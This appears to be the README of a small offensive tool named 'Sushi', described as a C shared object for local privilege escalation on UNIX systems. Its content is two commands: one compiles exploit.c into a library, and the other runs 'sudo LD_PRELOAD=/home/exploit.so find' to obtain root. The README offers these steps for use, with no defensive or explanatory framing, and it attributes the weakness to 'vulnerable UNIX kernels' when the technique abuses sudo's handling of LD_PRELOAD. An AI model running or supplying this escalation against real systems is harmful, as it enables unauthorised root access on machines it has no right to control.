# Sushi
Sushi すし, a shared object written in C language to perform LPE (Local Privilege Escalation) within vulnerable UNIX kernels using the LD_PRELOAD check

# Compile and run
- Use the following command to create the shared object:
`gcc -fPIC -shared -o exploit.so exploit.c -nostartfiles`
- Now use this shared object as a value for LD_PRELOAD and get root privileges:
`sudo LD_PRELOAD=/home/exploit.so find`
